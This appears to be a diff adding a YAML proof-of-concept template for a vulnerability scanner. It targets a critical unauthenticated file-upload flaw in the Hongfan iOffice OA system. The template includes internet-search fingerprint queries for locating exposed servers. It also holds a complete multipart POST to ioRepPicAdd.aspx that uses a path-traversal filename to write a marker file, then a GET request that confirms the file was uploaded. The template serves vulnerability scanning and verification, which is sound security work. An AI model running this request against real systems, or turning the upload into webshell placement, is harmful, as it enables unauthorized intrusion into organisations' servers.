@@ -1,0 +1,52 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    threatbook-query: 
+    cve: 
+    cnvd:
+    tips: /iOffice/upfiles/rep/pic/4ndex.txt  |  绝对路径   G:/iOffice/upfiles/rep/pic/4ndex.txt
+    
+name: poc-yaml-hongfan-ioffice-ioRepPicAdd.aspx-upload
+transport: http
+set:
+  s1: randomInt(10000,99999)
+  s2: randomLowercase(8)
+
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /ioffice/prg/set/Report/ioRepPicAdd.aspx
+      follow_redirects: false
+      headers:
+        Content-Disposition: attachment; filename="filename.jpg"
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}
+      body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"__EVENTTARGET\";\r\n\r\nctl00$cntButton$cmdOK\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"ctl00$cntForm$File1\"; filename=\"../4ndex.txt\"\r\nContent-Type: image/jpeg\r\n\r\n4ra1n\r\n------WebKitFormBoundary{{s2}}\r\n"
+    expression: >-
+      response.status == 200 && response.body_string.contains("上传")
+
+    output:
+      search: |-
+        "ASP.NET_SessionId=(?<token>\\w*)".bsubmatch(response.raw_header)
+      token: search["token"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /iOffice/upfiles/rep/pic/4ndex.txt
+      follow_redirects: false
+      headers:
+      body: 
+    expression: >-
+      response.status == 200 && response.body_string.contains("4ra1n")
+
+expression: r0()  && r1()
